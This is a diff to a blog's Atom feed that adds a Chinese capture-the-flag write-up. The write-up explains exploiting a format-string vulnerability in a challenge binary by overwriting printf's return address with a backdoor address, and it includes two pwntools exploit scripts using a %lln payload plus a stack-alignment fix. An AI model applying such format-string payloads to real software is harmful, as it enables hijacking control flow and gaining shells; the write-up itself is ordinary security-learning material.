@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-07-19T11:18:53.689Z</updated>
+  <updated>2023-09-23T13:32:35.268Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>解决之前在格式化字符串的学习过程中的遗留和遗忘的问题</title>
+    <link href="http://example.com/2023/09/23/%E8%A7%A3%E5%86%B3%E4%B9%8B%E5%89%8D%E5%9C%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%81%97%E7%95%99%E5%92%8C%E9%81%97%E5%BF%98%E7%9A%84%E9%97%AE%E9%A2%98/"/>
+    <id>http://example.com/2023/09/23/%E8%A7%A3%E5%86%B3%E4%B9%8B%E5%89%8D%E5%9C%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%81%97%E7%95%99%E5%92%8C%E9%81%97%E5%BF%98%E7%9A%84%E9%97%AE%E9%A2%98/</id>
+    <published>2023-09-23T03:49:44.000Z</published>
+    <updated>2023-09-23T13:32:35.268Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="通过格式化字符串漏洞修改函数的返回地址"><a href="#通过格式化字符串漏洞修改函数的返回地址" class="headerlink" title="通过格式化字符串漏洞修改函数的返回地址"></a>通过格式化字符串漏洞修改函数的返回地址</h2><p>我将通过例题来说明，话不多说直接上题</p><p><a href="https://pan.baidu.com/s/1bWKL-y2KVU1Iob5XODRshw">https://pan.baidu.com/s/1bWKL-y2KVU1Iob5XODRshw</a>  （tcm:chen）</p><p>这个是第二届陇剑杯线下的题算是比较入门的格式化字符串的题了。</p><p>先查看其保护（我用的虚拟机版本是18.04）<img src="/2023/09/23/%E8%A7%A3%E5%86%B3%E4%B9%8B%E5%89%8D%E5%9C%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%81%97%E7%95%99%E5%92%8C%E9%81%97%E5%BF%98%E7%9A%84%E9%97%AE%E9%A2%98/2.png"></p><p>在ida中打开分析<img src="/2023/09/23/%E8%A7%A3%E5%86%B3%E4%B9%8B%E5%89%8D%E5%9C%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%81%97%E7%95%99%E5%92%8C%E9%81%97%E5%BF%98%E7%9A%84%E9%97%AE%E9%A2%98/3.png"></p><p>可以看到只有一个输入和输出，并且该程序循环只进行一次，执行完printf函数后，程序便exit退出，最重要的一点是该程序存在格式化字符串漏洞。</p><p>一开始我想的是，通过修改printf函数的got表来进行操作，可是该程序执行完后便退出了，根本不会再次执行printf函数，</p><p>后面我才看到原来此程序是有后门的，我们可以修改printf函数的返回地址为后门，便可以getshell。</p><p>说干就干，首先我们先在gdb中找到printf的返回地址<img src="/2023/09/23/%E8%A7%A3%E5%86%B3%E4%B9%8B%E5%89%8D%E5%9C%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%81%97%E7%95%99%E5%92%8C%E9%81%97%E5%BF%98%E7%9A%84%E9%97%AE%E9%A2%98/4.png"></p><p>我们可以看到printf的返回地址是&lt;__libc_start_main+231&gt;,我们的目的就是将这个函数的地址修改为后门函数的地址（4006F8）。</p><p>我们通过命令查看修改该字段的偏移<img src="/2023/09/23/%E8%A7%A3%E5%86%B3%E4%B9%8B%E5%89%8D%E5%9C%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%81%97%E7%95%99%E5%92%8C%E9%81%97%E5%BF%98%E7%9A%84%E9%97%AE%E9%A2%98/5.png"></p><p>对应写出其exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&quot;./fmt3_x64&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;fmt3_x64&quot;</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload=<span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x4006f8</span>)+<span class="string">&quot;c%11$lln&quot;</span> <span class="comment">#后门函数的地址</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()                    </span><br></pre></td></tr></table></figure><p>注：%n表示将0x64写入偏移10处保存的指针所指向的地址（4字节）</p><p>​       %hn表示写入的地址空间为2字节</p><p>​       %h h n 表 示 写 入 的 地 址 空 间 为 1 字 节 </p><p>​       %lln表示写入的地址空间为8字节</p><p>可是却没有成功getshell<img src="/2023/09/23/%E8%A7%A3%E5%86%B3%E4%B9%8B%E5%89%8D%E5%9C%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%81%97%E7%95%99%E5%92%8C%E9%81%97%E5%BF%98%E7%9A%84%E9%97%AE%E9%A2%98/6.png"></p><p>原因很显而易见栈没对齐，一般情况下加个retn补齐那8个字节就行了，但是咱们这个直接修改返回地址的，添加retn是很麻烦的（貌似就行不通）。这里还有一个办法，后门函数的地址+1，这样就打通了，那么为什么呢？</p><p>我们查看后门函数的汇编<img src="/2023/09/23/%E8%A7%A3%E5%86%B3%E4%B9%8B%E5%89%8D%E5%9C%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%81%97%E7%95%99%E5%92%8C%E9%81%97%E5%BF%98%E7%9A%84%E9%97%AE%E9%A2%98/7.png"></p><p>首先我们知道 retnde作用就相当于pop rip ，使地址增加8个字节，达到补齐的目的而push命令刚好与之相反，我们这里不后门函数的地址（0x4006f8）,而是用（0x4006f9）的原因就是略过push从而达到添加retn的目的。</p><p>所以正确的exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&quot;./fmt3_x64&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;fmt3_x64&quot;</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload=<span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x4006f9</span>)+<span class="string">&quot;c%11$lln&quot;</span> </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()              </span><br></pre></td></tr></table></figure><p><img src="/2023/09/23/%E8%A7%A3%E5%86%B3%E4%B9%8B%E5%89%8D%E5%9C%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%81%97%E7%95%99%E5%92%8C%E9%81%97%E5%BF%98%E7%9A%84%E9%97%AE%E9%A2%98/8.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;通过格式化字符串漏洞修改函数的返回地址&quot;&gt;&lt;a href=&quot;#通过格式化字符串漏洞修改函数的返回地址&quot; class=&quot;headerlink&quot; title=&quot;通过格式化字符串漏洞修改函数的返回地址&quot;&gt;&lt;/a&gt;通过格式化字符串漏洞修改函数的返回地址&lt;/h2&gt;&lt;p&gt;我将</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>初探unlink</title>
